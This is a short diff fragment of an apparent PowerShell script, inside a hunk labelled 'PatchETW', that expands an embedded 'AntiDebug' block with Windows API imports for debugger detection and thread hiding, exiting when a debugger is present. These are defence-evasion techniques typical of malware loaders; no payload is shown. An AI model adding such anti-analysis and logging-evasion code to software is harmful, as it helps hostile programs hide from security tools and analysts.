@@ -469,11 +469,34 @@ public static void PatchETW()
                 exit
             }
             $debugCheck = @'
-[DllImport("kernel32.dll")]
+[DllImport("kernel32.dll", SetLastError = true)]
 public static extern bool IsDebuggerPresent();
-[DllImport("kernel32.dll")]
+
+[DllImport("kernel32.dll", SetLastError = true)]
 public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+
+[DllImport("ntdll.dll", SetLastError = true)]
+public static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref IntPtr processInformation, uint processInformationLength, ref uint returnLength);
+
+[DllImport("ntdll.dll", SetLastError = true)]
+public static extern int NtSetInformationThread(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, uint threadInformationLength);
+
+[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern bool CloseHandle(IntPtr hObject);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern void OutputDebugString(string lpOutputString);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern ulong GetTickCount64();
+
+[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
 '@
+
             $debugType = Add-Type -MemberDefinition $debugCheck -Name "DebugCheck" -Namespace "AntiDebug" -PassThru
             if ($debugType::IsDebuggerPresent()) {
                 exit
